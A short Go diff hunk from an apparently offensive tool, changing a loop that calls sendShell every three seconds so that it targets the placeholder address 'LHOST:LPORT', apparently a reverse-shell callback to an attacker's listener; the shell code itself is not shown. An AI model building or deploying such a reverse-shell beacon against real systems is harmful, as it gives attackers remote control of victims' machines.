@@ -14,7 +14,7 @@ import (
 func main() {
 	for {
 		time.Sleep(3 * time.Second)
-		sendShell(":")
+		sendShell("LHOST:LPORT")
 	}
 }
 
